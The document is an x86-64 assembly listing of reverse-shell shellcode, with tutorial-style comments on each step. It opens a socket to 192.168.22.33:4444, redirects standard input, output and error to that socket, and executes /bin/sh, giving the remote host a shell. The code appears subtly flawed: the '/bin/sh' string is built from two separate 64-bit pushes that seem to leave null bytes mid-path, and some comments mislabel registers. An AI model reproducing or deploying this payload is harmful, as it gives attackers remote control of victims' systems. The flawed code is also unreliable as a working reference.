BITS 64

; Do the steps to setup a socket (1)
; Setup the arguments to socket() in appropriate registers
xor rdx, rdx  ; Flags = 0
mov rsi, 1    ; SOCK_STREAM = 1
mov rdi, 2    ; AF_INET = 2
; We're calling SYS_socket
mov rax, 41
; Get the socket
syscall

; Time to setup the struct sockaddr_in (2), (3)
; push the address so it ends up in network byte order
; 192.168.22.33 == 0xC0A81621
push 0x2116a8c0
; push the port as a short in network-byte order
; 4444 = 0x115c
mov bx, 0x5c11
push bx
; push the address family, AF_INET = 2
mov bx, 0x2
push bx

; Let's establish the connection (4)
; Save address of our struct
mov rsi, rsp
; size of the struct
mov rdx, 0x10
; Our socket fd
mov rdi, rax
; Preserve sockfd
push rax
; Call SYS_connect
mov rax, 42
; Make the connection
syscall

; Let's duplicate the FDs from our socket. (5)
; Load the sockfd
pop rdi
; STDERR
mov rsi, 2
; Calling SYS_dup2 = 0x21
mov rax, 0x21
; Syscall!
syscall
; mov to STDOUT
dec rsi
; Reload rdi
mov rax, 0x21
; Syscall!
syscall
; mov to STDIN
dec rsi
; Reload rdi
mov rax, 0x21
; Syscall!
syscall

; Now time to execve (6)
; push "/bin/sh\0" on the stack
push 0x68732f
push 0x6e69622f
; preserve filename
mov rdi, rsp
; array of arguments
xor rdx, rdx
push rdx
push rdi
; pointer to array in rsi
mov rsi, rsp
; call SYS_execve = 59
mov rax, 59
; execute the shell!
syscall
